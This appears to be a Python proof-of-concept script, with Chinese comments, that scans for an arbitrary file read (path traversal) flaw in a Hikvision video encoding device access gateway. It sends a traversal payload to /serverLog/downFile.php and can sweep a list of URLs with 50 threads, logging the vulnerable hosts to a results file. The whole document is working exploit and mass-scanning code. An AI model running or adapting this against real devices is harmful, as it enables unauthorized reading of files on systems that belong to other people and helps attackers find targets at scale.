#​海康威视视频编码设备接入网关存在任意文件读取漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                             

"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="​海康威视视频编码设备接入网关存在任意文件读取漏洞")
    parser.add_argument('-u','-url',dest='url',type=str,help="Please input your URL")
    parser.add_argument('-f','-file',dest='file',type=str,help="Please input your File path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php"
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if res1.status_code == 200 and 'fileName' in res1.text:
            print(f"[+]{target}存在任意文件读取漏洞")
            with open('result.txt','a')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在任意文件读取漏洞")
    except Exception as e:
        print(f"Exception occurred: {e}")

if __name__ == "__main__":
    main()